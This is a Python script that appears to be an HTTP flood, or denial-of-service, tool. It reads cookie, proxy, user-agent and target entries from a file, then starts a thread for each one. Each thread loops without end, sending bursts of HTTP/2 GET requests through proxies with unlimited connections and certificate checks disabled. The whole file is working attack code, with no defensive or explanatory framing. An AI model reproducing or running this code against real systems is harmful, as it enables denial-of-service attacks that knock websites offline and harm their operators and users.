# -*- coding: utf-8 -*-
# @Time    :  2022/3/14
# @Author  :  TuTu
import time
import httpx
import threading


def test(atk_url, cookie: str, proxy, ua):
	headers = {
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"user-agent": ua,
		"Upgrade-Insecure-Requests": "1",
		"Accept-Encoding": "*",
		"Content-Type": "*",
		"Cookie": cookie.strip(),
		"Accept-Language": "en-US,en;q=0.9",
		"Cache-Control": "max-age=0",
		"referer": atk_url,
		"Connection": "Keep-Alive",
	}

	proxies = {"all://": f"http://{proxy}"}
	limits = httpx.Limits(max_keepalive_connections=None, max_connections=None, keepalive_expiry=60)
	while True:
		with httpx.Client(headers=headers, http2=True, limits=limits, timeout=None,
		                  verify=False, proxies=proxies,follow_redirects=False) as client:
			request = client.build_request("GET", atk_url)
			try:
				for _ in range(200):
					sx = client.send(request)
					print(f"taget: {atk_url} version: {sx.http_version} code:{sx.status_code}")
					if sx.status_code != 200:
						break
					if not sx:
						break
			except:
				pass


for line in open('.cookietmp.txt'):
	line = line.strip()
	proxyip_port = line.split('---')[1]
	cookie = line.split('---')[0]
	ua = line.split('---')[2]
	targeturl = line.split('---')[3]
	t1 = threading.Thread(target=test, args=(targeturl, cookie, proxyip_port, ua))
	t1.start()
	time.sleep(0.01)

